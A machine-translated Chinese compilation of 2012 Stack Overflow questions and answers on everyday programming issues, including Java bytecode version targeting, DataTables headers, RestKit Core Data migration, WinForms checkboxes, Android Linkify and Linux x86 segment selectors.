注意：- 我欢迎 Mark down 作为一个健康的批评，但请务必在评论中写下你的 markdown 原因，以便我可以改进

# java - Jar 文件未在 Java 6 或更早版本上运行

> ID：11735677
> 
> 赞同：0
> 
> 时间：2012-07-31T08:04:04.083
> 
> 标签：java

我的 Windows 计算机有 netbeans、JDK 7 和 JRE 7。我制作了一个程序，但 jar 文件不能在只有 Java 6 的 MAC 上运行。在 MAC 上安装 Java 7 很麻烦。有人可以帮我运行文件吗？

堆栈跟踪：

```
: Unsupported major.minor version 51.0
at java.lang.ClassLoader.defineClass1(Native Method)
at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:10:16.167

这是意料之中的。如果你想用 JDK 7 编译到目标 6，你应该使用以下（假设你不使用 Java 7 特性）：

```
javac -source 1.6 -target 1.6 
```

如果您使用 Maven，请选择：

```
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-compiler-plugin</artifactId>
  <configuration>
    <source>1.6</source>
    <target>1.6</target>
  </configuration>
</plugin> 
```

正如您在评论中所说，您使用的是 Netbeans。我没有个人经验，但根据[文档](http://netbeans.org/kb/docs/java/javase-jdk7.html)，您可以更改*Source/Binary Format*的值（在这种情况下为 JDK 6）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:09:23.063

您应该编译您的源代码，例如在 Java 6 运行时。使用 Ant，它是使用任务的`target`属性来实现的`javac`。使用 Maven，使用[Maven 编译器插件](http://maven.apache.org/plugins/maven-compiler-plugin/examples/set-compiler-source-and-target.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:10:34.857

您需要将编译目标设置为 JDK 6（或 5，或任何您想要支持的最低版本）。

在 Netbeans 中，转到项目属性（右键单击项目，选择 Properties_。然后在出现的对话框中，选择“Sources”并将“Source Level”更改为 JDK 6。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-07-31T08:10:44.860

通常，您不能使用 Java 6 运行时运行 Java 7 文件。您必须安装 Java 7，或者在 Java 6 下重建 jar。

# javascript - 在表数据表中动态添加表头

> ID：11735687
> 
> 赞同：0
> 
> 时间：2012-07-31T08:04:44.737
> 
> 标签：javascript, jquery, html, datatables

`THEAD`是否可以使用 dataTables处理 2 行？

```
<table>
    <thead>
        ## row 1
        ## row 2
    </thead>
    <tbody></tbody>
</table> 
```

在第 1 行中，我需要 2 个单列和一列`colspan="3"`：

```
<tr>
    <th></th>
    <th></th>
    <th colspan="3"></th>
</tr> 
```

在第 2 行，我需要 5 列：

```
<tr>
    <th></th>
    <th></th>
    <th></th>
    <th></th>
</tr> 
```

但我有一个案例，我不需要 5 列，而只需要 3 列。

这可以动态生成吗？

**更新**：我试过：[http ://datatables.net/release-datatables/examples/basic_init/complex_header.html](http://datatables.net/release-datatables/examples/basic_init/complex_header.html)

但是没有很好的例子它是如何生成的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:16:57.693

如果您查看[您发布的示例链接](http://datatables.net/release-datatables/examples/basic_init/complex_header.html)的源代码，似乎很清楚：

```
<table cellpadding="0" cellspacing="0" border="0" class="display" id="example">
    <thead>
        <tr>
            <th rowspan="2">Rendering engine</th>
            <th rowspan="2">Browser</th>
            <th colspan="3">Details</th>
        </tr>
        <tr>
            <th>Platform(s)</th>
            <th>Engine version</th>
            <th>CSS grade</th>
        </tr>
    </thead>
    <tfoot>
        <tr>
            <th rowspan="2">Rendering engine</th>
            <th rowspan="2">Browser</th>
            <th>Platform(s)</th>
            <th>Engine version</th>
            <th>CSS grade</th>
        </tr>
        <tr>
            <th colspan="3">Details</th>
        </tr>
    </tfoot> 
```

*（代码从上面的链接中提取）*

* * *

关于查看源代码的一句话：在 Firefox 中，您可以按`ctrl`+`u`键查看页面源代码。即使页面上有大量的 jQuery 操作，该窗口中的源代码也将始终是未经 DOM 修改的原始代码。

# entity-framework - 在 EF DatabaseFirst 中为实体定义通用存储库

> ID：11735692
> 
> 赞同：0
> 
> 时间：2012-07-31T08:05:15.627
> 
> 标签：entity-framework, database-first

我正在从 CodeFirst 迁移到 DatabaseFirst 以映射我的视图。在我的 CodeFirst 方法中，我有一个这样的基本实体：

```
public abstract class BaseEntity
{
    /// <summary>
    /// Gets or sets the entity identifier
    /// </summary>
    public virtual int Id { get; set; }
... // Some more methods here for equality checking
} 
```

我从这个基类派生了我的所有类，因为它们中的每一个都有一个 Id。所以我用这个 BaseClass 创建了一个通用存储库。我的存储库如下所示：

```
public partial class EfRepository<T> where T : BaseEntity
{
    public readonly DemirbasContext context;
    private DbSet<T> _entities;

    /// <summary>
    /// Ctor
    /// </summary>
    /// <param name="context">Object context</param>
    public EfRepository(DemirbasContext context)
    {
        this.context = context;
    }

    public T GetById(object id)
    {
        return this.Entities.Find(id);
    }

    public void Insert(T entity)
    {
        try
        {
            if (entity == null)
                throw new ArgumentNullException("entity");

            this.Entities.Add(entity);

            this.context.SaveChanges();
        }
        catch (Exception e)
        {
        ...
        }
    }
    // Other methods here Update, Delete etc 
```

所以我能够通过像这样指定泛型类型参数来创建存储库

```
EfRepository<Car> carRepo = new EfRepository<Car>(); 
```

在 DatabaseFirst 中，我无法从基类派生实体类。有没有办法做到这一点，或者你有什么建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:16:33.490

糟糕，我错过了代码生成器。

右键单击您的数据模型（.EDM 文件），然后单击添加代码生成项。选择 DbContext（用于简化的 DbContext API）。

This creates two files with .tt extensions: One for context and one for entities. If you expand the file, you will see .tt file holds all your classes there.

You can modify it as you need.

# f# - F# 记录与 FlowDocument 的奇怪行为

> ID：11735705
> 
> 赞同：1
> 
> 时间：2012-07-31T08:05:58.010
> 
> 标签：f#, record

我试图在 Visual Studio 2012 RC 中创建一个包含 FlowDocument 的 F# 记录类型，有点像这样：

```
module RecordTest =
    open System.Windows.Documents

    type TestRecord =
        {
            TestName : FlowDocument
        }

    let test = { TestName = new FlowDocument () } 
```

奇怪的是，这对我不起作用。Visual Studio 告诉我：`The record label TestName is not defined.`将鼠标悬停在 的类型定义上`TestRecord`不会显示工具提示。如果我将类型更改`TestName`为 eg `string`，则一切正常。

对于`FlowDocument`，需要引用`PresentationFramework.dll`。

这里发生了什么？任何人都能够得到这个工作？

谢谢。

**未来的读者：**如果问题看起来不清楚或不一致，请回答和评论，请注意原始问题（答案和一些评论所引用的）有不同的缩进（这会影响代码）。我不会回滚编辑，因为某些评论确实指的是缩进版本。*—— 7 月 31 日，拉蒙·斯尼尔*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:22:06.010

我通过在第一行之后缩进所有内容来实现这一点（注意，这已经在问题的代码示例中完成了），并添加了对 PresentationCore、System.Xaml 和 WindowsBase 以及 PresentationFramework 的引用。

但是，不确定这是否解释了您的错误消息！

我使用的是 VS2010，所以行为可能会有所不同。

# php - 更快网站的提示

> ID：11735707
> 
> 赞同：4
> 
> 时间：2012-07-31T08:06:16.313
> 
> 标签：php, jquery, html, css, optimization

我想知道是否有任何提示和技巧可以让我的网站更快地加载？

例如，在我的网站中，我有 4 组背景图像，它们在悬停时会切换。
有没有办法在之前加载它们？
有没有一个jQuery插件？

如果我在 php 中回显一个 div，其中包含我网站中的所有图像，但在 DOCTYPE 之前不显示任何图像。会有帮助吗？

和 html/css/jquery 的一般提示？

欢迎所有建议...

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:09:24.330

使用**[Sprites](http://css-tricks.com/css-sprites/)**可以更快地加载图像。使用它只需要你加入你的图像。[CSS Sprite Generator](http://spritegen.website-performance.org/)可以帮助你。

如果你想给你的背景一次加载的错觉，请尝试使用[**隔行扫描**](http://en.wikipedia.org/wiki/Interlacing_%28bitmaps%29)的PNG。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:10:28.543

我认为您可以在这里找到一些非常好的提示：

[http://developer.yahoo.com/performance/](http://developer.yahoo.com/performance/)

尤其是在这里：

[http://developer.yahoo.com/performance/rules.html](http://developer.yahoo.com/performance/rules.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:11:58.030

我认为你可以做一些事情。

*   减少请求的数量。您可以制作[精灵](http://de.wikipedia.org/wiki/CSS-Sprites)并将所有图像放在一起。
*   使用 APC 和其他缓存机制
*   使用[内存缓存](http://memcached.org/)
*   阿帕奇缓存模块
*   您可以使用Google 的[modpagespeed](http://memcached.org/)。并充分利用它们。

但我认为最好的方法是拥有一个具有良好结构的良好编程网站。然后意味着不要加载太多类，只加载你需要的类等等。在这里你可以看看**设计模式**。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:12:50.783

理解这一点的一种交互方式是使用 Firefox 上 Firebug 插件的 Y-Slow 扩展。这个插件将评估您当前的网站，并在 CSS、压缩等方面为您提供适当的改进提示。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:14:26.230

# 适用于 Chrome 的 PageSpeed Insights

如果您下载适用于 Google Chrome 的插件，它会列出这些有助于加快网站速度的事实。

[https://developers.google.com/speed/docs/insights/using_chrome](https://developers.google.com/speed/docs/insights/using_chrome)

*   避免使用 CSS @import

    在外部样式表中使用 CSS @import 会在网页加载期间增加额外的延迟。

    *   避免元标记中的字符集*   避免错误请求*   将图像组合成 CSS 精灵*   延迟解析 JavaScript*   启用保活*   启用压缩*   内联小 CSS*   内联小 JavaScript*   利用浏览器缓存*   使着陆页重定向可缓存*   缩小 CSS*   缩小 HTML*   最小化重定向*   最小化请求大小*   优化图像*   优化样式和脚本的顺序*   首选异步资源*   将 CSS 放在文档头部*   从静态资源中删除查询字符串*   从一致的 URL 提供资源*   提供缩放图像*   指定 Vary: Accept-Encoding 标头*   指定缓存验证器*   指定字符集*   指定图像尺寸

# cocoa-touch - 使用 RestKit 进行轻量级迁移

> ID：11735712
> 
> 赞同：3
> 
> 时间：2012-07-31T08:06:40.587
> 
> 标签：cocoa-touch, ios5, core-data, migration, restkit

Apple 的文档为设置（自动）轻量级迁移提供了以下示例：

```
NSError *error = nil;
NSURL *storeURL = <#The URL of a persistent store#>;
NSPersistentStoreCoordinator *psc = <#The coordinator#>;
NSDictionary *options = [NSDictionary dictionaryWithObjectsAndKeys:
    [NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption,
    [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];

BOOL success = [psc addPersistentStoreWithType:<#Store type#>
                    configuration:<#Configuration or nil#> URL:storeURL
                    options:options error:&error];
if (!success) {
    // Handle the error.
} 
```

但是我使用的是 RestKit，它在幕后处理持久存储的创建。我的初始化代码的简化版本如下所示：

```
// Initialize RestKit
RKObjectManager* objectManager = [RKObjectManager objectManagerWithBaseURL:rootURL];

// Create the object store
objectManager.objectStore = [RKManagedObjectStore objectStoreWithStoreFilename:databaseName                 
                                                                 usingSeedDatabaseName:seedDatabaseName 
                                                                    managedObjectModel:nil //Don't need to pass it in. It is infered  
                                                                          delegate:self];
// Create Mappings
...

// Define Relationships
...

// Set Mappings
... 
```

鉴于 RestKit 在幕后创建了 persistantStore，我应该在哪里传递配置选项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T20:01:11.550

据我了解，RestKit 位于 Core Data 之上。因此，即使您使用种子数据库并让 RestKit 为对象管理器分配对象存储，也会使用 Core Data 提供的 sqlite 数据库。

要使用 RestKit 启用轻量级迁移，您可以使用`- (NSPersistentStoreCoordinator *)persistentStoreCoordinator`AppDelegate 中的方法（请参阅此[线程](https://stackoverflow.com/questions/10803201/core-data-migration-very-slow?rq=1)）

**应用委托**

```
- (NSPersistentStoreCoordinator *)persistentStoreCoordinator
{
    if (__persistentStoreCoordinator != nil) return __persistentStoreCoordinator;

    NSURL *storeURL = [[self applicationDocumentsDirectory] URLByAppendingPathComponent:@"thenameofyoursqlite.sqlite"];

    NSError *error = nil;
    __persistentStoreCoordinator = [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:[self managedObjectModel]];

    NSDictionary *options = [NSDictionary dictionaryWithObjectsAndKeys:
    [NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption,
    [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];

    if (![persistentStoreCoordinator addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeURL options:options error:&error])
    {
        NSLog(@"Auto migration failed, error %@, %@", error, error.userInfo);
        abort();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-31T12:27:19.893

`RKManagedObjectStore.m`您可以在, in`createPersistentStoreCoordinator`方法中添加这些选项。

RestKit 0.10 版本已经添加，不确定最新版本。但如果尚未添加，您可以自己添加。该方法的最终外观将是这样的。

```
- (void)createPersistentStoreCoordinator
{
    NSAssert(_managedObjectModel, @"Cannot create persistent store coordinator without a managed object model");
    NSAssert(!_persistentStoreCoordinator, @"Cannot create persistent store coordinator: one already exists.");
    NSURL *storeURL = [NSURL fileURLWithPath:self.pathToStoreFile];

    NSError *error;
    _persistentStoreCoordinator = [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:_managedObjectModel];

    // Allow inferred migration from the original version of the application.
    NSDictionary *options = [NSDictionary dictionaryWithObjectsAndKeys:
                             [NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption,
                             [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];

    if (![_persistentStoreCoordinator addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeURL options:options error:&error]) {
        if (self.delegate != nil && [self.delegate respondsToSelector:@selector(managedObjectStore:didFailToCreatePersistentStoreCoordinatorWithError:)]) {
            [self.delegate managedObjectStore:self didFailToCreatePersistentStoreCoordinatorWithError:error];
        } else {
            NSAssert(NO, @"Managed object store failed to create persistent store coordinator: %@", error);
        }
    }
} 
```

我已经在我的项目中测试了这一点，添加了 3 个新实体并重命名了一个旧实体，并且在不从设备中删除以前的应用程序的情况下运行完美。希望这对您有所帮助。

# python - GAE 应用程序在仅服务 3 个请求后超出配额“传入带宽”

> ID：11735714
> 
> 赞同：0
> 
> 时间：2012-07-31T08:06:46.293
> 
> 标签：python, google-app-engine

我在[https://paperlink2.appspot.com有一个低流量网站](https://paperlink2.appspot.com)

我在周末启用了计费来调整数据存储。完成后，我禁用了计费。

昨天，就在午夜过后，我注意到我的“传入带宽”超出了配额。

由于超额配额发生在午夜，我今天密切关注 - 它在只提供 3 个请求后就消失了...... 9 kb...... 在 3 分钟内......

怎么会这样？如果GAE团队中的任何人都可以快速浏览一下，我真的很感激~~有人可以提供任何建议吗？谢谢！

下面是今天的日志

```
----------------------------
2012-07-31 00:04:28.071 /js?y=0.29361433181115804 503 100ms 0kb
213.112.244.168 - - [31/Jul/2012:00:04:28 -0700] "GET /js?y=0.29361433181115804 HTTP/1.1" 503 0 - - "paperlink2.appspot.com" ms=100 cpu_ms=0 api_cpu_ms=0 cpm_usd=0.000040 

 2012-07-31 00:03:48.053 /js?y=0.4865090114862315 200 68ms 3kb Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1
213.112.244.168 - - [31/Jul/2012:00:03:48 -0700] "GET /js?y=0.4865090114862315 HTTP/1.1" 200 3874 - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1" "paperlink2.appspot.com" ms=69 cpu_ms=0 api_cpu_ms=0 cpm_usd=0.000473 instance=00c61b117c8c6f5d69c0df046a884b741337aa

2012-07-31 00:03:28.231 /js?y=0.5931225973034153 200 188ms 3kb Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1
213.112.244.168 - - [31/Jul/2012:00:03:28 -0700] "GET /js?y=0.5931225973034153 HTTP/1.1" 200 3874 - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1" "paperlink2.appspot.com" ms=188 cpu_ms=0 api_cpu_ms=0 cpm_usd=0.000477 instance=00c61b117c8c6f5d69c0df046a884b741337aa

2012-07-31 00:03:19.859 /js?y=0.5153093388288915 200 4576ms 3kb Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1
213.112.244.168 - - [31/Jul/2012:00:03:19 -0700] "GET /js?y=0.5153093388288915 HTTP/1.1" 200 3874 - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1" "paperlink2.appspot.com" ms=4576 cpu_ms=957 api_cpu_ms=0 cpm_usd=0.027121 loading_request=1 instance=00c61b117c8c6f5d69c0df046a884b741337aa

I2012-07-31 00:03:19.859
This request caused a new process to be started for your application, and thus caused your application code to be loaded for the first time. This request may thus take longer and use more CPU than a typical request for your application.

2012-07-30 23:59:35.503 / 503 56ms 0kb
165.225.134.101 - - [30/Jul/2012:23:59:35 -0700] "GET / HTTP/1.1" 503 0 - - "paperlink2.appspot.com" ms=56 cpu_ms=0 api_cpu_ms=0 cpm_usd=0.000020 
---------------------------- 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:28:18.867

几点注意事项：

1.  您所说的“午夜”是指哪个时区？Afaik GAE 计费日为太平洋标准时间。

2.  您指的9kb是传出带宽。

3.  当资源耗尽时，GAE 会产生 403 错误。我在您提供的日志中看到了这样的错误。

# c# - 在 C# 中访问动态创建的复选框

> ID：11735722
> 
> 赞同：0
> 
> 时间：2012-07-31T08:07:13.550
> 
> 标签：c#, winforms, forms, checkbox

当我使用以下代码打开表单时，我正在创建一些复选框：

```
 private void OpenFolder_Load(object sender, EventArgs e)
    {
        int i = 0;
        foreach (string file in filesToOpen)
        {
            Label lbl = new Label();
            lbl.Text = Path.GetFileNameWithoutExtension(file);
            lbl.Width = 200;
            lbl.Height = 25;
            lbl.AutoEllipsis = true;
            lbl.Location = new System.Drawing.Point(10, 40 + 25 * i);

            this.Controls.Add(lbl);

            string checkName = "check" + i;
            CheckBox check = new CheckBox();
            check.Checked = true;
            check.AccessibleName = checkName;
            check.Location = new System.Drawing.Point(340, 40 + 25 * i);
            check.CheckedChanged +=new EventHandler(check_CheckedChanged);

            this.Controls.Add(check);

            CheckBoxes.Add(check);

            i++;
        } 
```

并且我试图在每次更改以切换我的“确定”按钮时检查复选框的状态（用户只能在选中一定数量的复选框时进行验证）

这是我使用的代码，但由于我无法定位复选框而失败：

```
 private void check_CheckedChanged(Object sender, EventArgs e)
    {
        for (int i = 0; i < filesToOpen.Count(); i++)
        {
            string tbarName = "tbar" + i;
            string checkName = "check" + i;

            CheckBox ckb = this.Controls.OfType<CheckBox>()
                     .Where(c => c.AccessibleName.Equals(checkName)) as CheckBox;
            TrackBar tkb = this.Controls.OfType<TrackBar>()
                     .Where(t => t.AccessibleName.Equals(tbarName)) as TrackBar;
            //TrackBar tkb = this.Controls.Find(tbarName, false).First() as TrackBar;
            //CheckBox ckb = this.Controls.Find(checkName, false).First() as CheckBox;

            if (ckb.Checked == true)
            {
                //do stuff
            }
        }
    } 
```

我在做什么错/真的错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:15:01.457

鉴于您将复选框添加到自己的列表中：

```
CheckBoxes.Add(check); 
```

循环它会更简单，而不是试图找到与文件关联的控件：

```
foreach (var checkBox in CheckBoxes)
{
    if (checkbox.Checked)
    {
        // Do stuff...
    }
} 
```

但是，您不需要使用单独的列表。这一行是错误的：

```
CheckBox ckb = this.Controls.OfType<CheckBox>()
                   .Where(c => c.AccessibleName.Equals(checkName)) as CheckBox; 
```

`Where`返回 a`IEnumerable<CheckBox>`但您试图将其直接转换为 a`CheckBox`将返回`null`。你应该拥有的是：

```
CheckBox ckb = this.Controls.OfType<CheckBox>()
                   .Where(c => c.AccessibleName.Equals(checkName)).First(); 
```

您仍然需要检查是否`ckb`为空（以防列表中没有任何内容），但这应该会返回您正在寻找的控件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:12:49.507

检查“this”的类型，然后检查它的 Controls 集合 - 您的复选框可能是树下的几次迭代。

您需要某种递归查找控件功能，例如[本文中的功能](http://intrepidnoodle.com/articles/24.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:56:27.320

不需要每次检查都遍历所有复选框，这是非常困难的处理工作。相反，在创建时，您始终知道创建它们的状态 - 所以只需保留“已选中”复选框的数量。当一个复选框被选中时增加计数，当一个未选中时 - 从计数中取出 1。稍后检查：“if (count == requiredCount) {//Logic here}” 所以代码看起来像：

```
private int checkedCount;
private void check_CheckedChanged(Object sender, EventArgs e) 
{
  this.checkedCount += (sender as CheckBox).Checked?1:-1;
  if(this.checkedCount == requiredCount)
  { 
    //do stuff 
  } 
} 
```

祝你发展顺利。

# android - 从 textview-android 获取链接文本...？

> ID：11735725
> 
> 赞同：4
> 
> 时间：2012-07-31T08:07:20.740
> 
> 标签：android, textview, linkify

我的 android 应用程序中有一个 textview。

```
 textView.setText(message);
    Linkify.addLinks(textView, Linkify.ALL); 
```

使用此代码，它可以识别电话号码、电子邮件地址、网络链接等，并将其突出显示以供点击，以便进行适当的意图呼叫。

我想获取文本视图中的任何链接，将其存储在数组示例中

如果我的文本视图包含`"Hello, this is deer, my phone number is 9988776655 and email id is abc@gmail.com and weburl is www.abc.com"`字符串

然后我想获取**“9988776655”，“abc@gmail.com”，“www.abc.com”**并将其存储在数组中，有可能......！？！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-31T08:26:30.067

您可以在调用后使用[TextView#getUrls](http://developer.android.com/reference/android/widget/TextView.html#getUrls%28%29)`Linkify` ，如下所示：

```
URLSpan spans[] = textView.getUrls();
for(URLSpan span: spans) {
    Log.d(TAG, span.getURL());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:25:04.433

使用 textView.getUrls() 。然后遍历这个数组并使用 URLSpan.getUrls() 来获取单个链接

# linux-kernel - x86 上 linux 的段定义

> ID：11735729
> 
> 赞同：5
> 
> 时间：2012-07-31T08:07:31.680
> 
> 标签：linux-kernel, x86

Linux 3.4.6 在 arch/x86/include/asm/segment.h 中定义了以下宏。任何人都可以解释为什么 __USER 宏将 3 添加到定义的常量以及为什么不为 __KERNEL 宏执行此操作？

```
#define __KERNEL_CS (GDT_ENTRY_KERNEL_CS*8)
#define __KERNEL_DS (GDT_ENTRY_KERNEL_DS*8)
#define __USER_DS   (GDT_ENTRY_DEFAULT_USER_DS*8+3)
#define __USER_CS   (GDT_ENTRY_DEFAULT_USER_CS*8+3) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T08:20:01.260

这四个符号代表[段描述符](http://en.wikipedia.org/wiki/Segment_descriptor)。这些描述符的两个最低有效位包含与它们相关的[特权级别](http://en.wikipedia.org/wiki/Privilege_level)，第三个最低有效位包含描述符表类型（[GDT](http://en.wikipedia.org/wiki/Global_Descriptor_Table)或[LDT](http://en.wikipedia.org/wiki/Local_Descriptor_Table)）。稍后发生的代码更清楚地说明了这一点：

```
/* User mode is privilege level 3 */
#define USER_RPL                0x3
/* LDT segment has TI set, GDT has it cleared */
#define SEGMENT_LDT             0x4
#define SEGMENT_GDT             0x0

/* Bottom two bits of selector give the ring privilege level */
#define SEGMENT_RPL_MASK        0x3
/* Bit 2 is table indicator (LDT/GDT) */
#define SEGMENT_TI_MASK         0x4 
```

为此，描述符表条目乘以`8`，将其向左移动三位，然后`OR`与表类型和特权级别（使用加法）一起编辑：

```
/* GDT, ring 0 (kernel mode) */
#define __KERNEL_CS (GDT_ENTRY_KERNEL_CS*8)

/* GDT, ring 3 (user mode) */
#define __USER_CS   (GDT_ENTRY_DEFAULT_USER_CS*8+3) 
```

# extjs - 树到网格节点拖动在 Ext4.0 但 4.1 中工作

> ID：11735730
> 
> 赞同：1
> 
> 时间：2012-07-31T08:07:37.700
> 
> 标签：extjs, drag, extjs4.1, gridpanel, treepanel

我有一个树面板

```
var t = new Ext.TreePanel({
    .
    .
    store: <loaded dynamically>
    viewConfig: {
        allowCopy: true,
        copy: true,
        plugins:{
            ptype: 'treeviewdragdrop',
            dragGroup: 'dragGroup',
            dragText: 'Place the node to grid'
        }
    }
}); 
```

和一个网格面板

```
var bpMappingGrid = Ext.create('Ext.grid.Panel',{
    .
    .
    .
    .
    columns:[
    {
        header:'Application Name',
        dataIndex:'applicationName', //The same name should be there in treenode too
        align:'center',
        width:150
    },{
        header:'Tagged BusinessProcess',
        dataIndex:'businessProcessName', //The same name should be there in treenode too
        align:'center',
        width:180
    }
    ],
    store: <loaded dynamically>,
    viewConfig: {
        plugins:{
            ptype: 'gridviewdragdrop',
            dropGroup: 'dragGroup'
        }
    }
}); 
```

每个节点都有一个关联的`businessProcessName`and `applicationName`。所以当我们拖动一个节点时，它会将这些数据索引的对应值分配给网格。

**此代码在 ExtJS 4.0 中运行良好，但它在 ExtJS 4.1 的网格中插入了一个空行。请告诉我如何使它适用于 ExtJS 4.1。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T16:30:27.503

确保树形网格和常规网格都定义了包含以下字段的模型：businessProcessName 和 applicationName。

# android - android布局设计如何支持多屏

> ID：11735732
> 
> 赞同：0
> 
> 时间：2012-07-31T08:07:42.007
> 
> 标签：android

我正在使用android2.2。我创建了drawable-mdpi、drawable-hdpi、res/drawable-xhdpi。我为大、中、小屏幕尺寸创建了布局文件夹。我在清单文件中使用了。我仍然无法获得对多个屏幕尺寸的支持。例如，对于大、中、小屏幕尺寸，图像尺寸和布局边距保持不变。谁能帮我？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:38:35.487

使用 layout-small、layout-normal、layout-large、layout-xlarge 命名布局文件夹。它根据移动 dpi 工作。它不依赖于屏幕大小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:23:39.750

如果你想为所有屏幕创建布局，你可以使用**weightsum**来管理它们。

此示例代码可能对您有所帮助。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:weightSum="1.0" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="wrap_content"
        android:layout_height="0dp"
        android:layout_weight="0.3"
        android:src="@drawable/ic_launcher" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_weight="0.4"
        android:orientation="vertical" 
        android:weightSum="1.0">

    </LinearLayout>

</LinearLayout> 
```

# c# - 寻找一种简单的方法来编写和测试一些代码，在 Visual c#

> ID：11735733
> 
> 赞同：2
> 
> 时间：2012-07-31T08:07:43.423
> 
> 标签：c#, testing, visual-c#-express-2010

这些天我从 Java 转向 C#，并使用 Visual C# 2010 express。

有时我想编写和测试一些简单的代码，但我发现它不像在 Eclipse 中那么容易：`main`在任何 java 文件中编写一个方法，然后运行它。

在 VC# 中，当我`Main`在 .cs 文件中添加一个方法时，它会注意到我在这个项目中有两个`Main`条目。我必须在运行之前重命名另一个，并且稍后必须重命名它。

是否有捷径可寻？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:13:00.507

Visual Studio 更适合大型项目。如果您只是想测试一些代码，那么我要么将其粘贴在您的应用程序的主要方法中，要么忘记 VS 并通过代码暂存器运行它。

最好的 C# 代码暂存器是[LINQPad](http://www.linqpad.net)

当然，如果您要进行大量测试，您可能需要删除代码所具有的任何依赖项。如果不知道代码的范围或项目的类型，就很难说。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:15:01.907

正如@Alexander R 所说，LINQPad 是一个很棒的工具。我将它广泛用于小片段，例如测试我发布到 Stack Overflow 的答案。

如果我必须能够在我当前的项目中调用其他代码，我会在我的解决方案中添加一个单元测试项目。当我想测试一些东西时，我在一个新的测试方法中编写代码，然后使用 Ctrl+R、Ctrl+T 快捷键运行当前选择的测试方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:28:57.533

单声道编译器包括一个 REPL 实用程序 ( [http://www.mono-project.com/CsharpRepl](http://www.mono-project.com/CsharpRepl) )。类似的东西应该包含在 C#/Visual Studio 的未来版本中（请参阅[Roslyn 项目](http://blogs.msdn.com/b/csharpfaq/archive/2012/06/05/announcing-microsoft-roslyn-june-2012-ctp.aspx)的最新 CTP ）。

另一种可能性是[“测试驱动的 .Net”](http://www.testdriven.net/)实用程序，但这不适用于 Visual Studio express。它 (ao) 允许您直接从 Visual Studio 中运行任何方法。

LINQPad 和 Snippet Compiler 也是可行的选择。

您也可以简单地创建一个 .cs 文件并在命令行上编译它。例如，将此代码放在名为 hello.cs 的文件中

```
using System;

public class Program {
    public static void Main() {
        Console.WriteLine("Hello World");
    }
} 
```

然后在命令行上，编译`csc hello.cs`

=> 这会创建你可以运行的 hello.exe。

* * *

## 回答 #4

> 赞同：0
> 
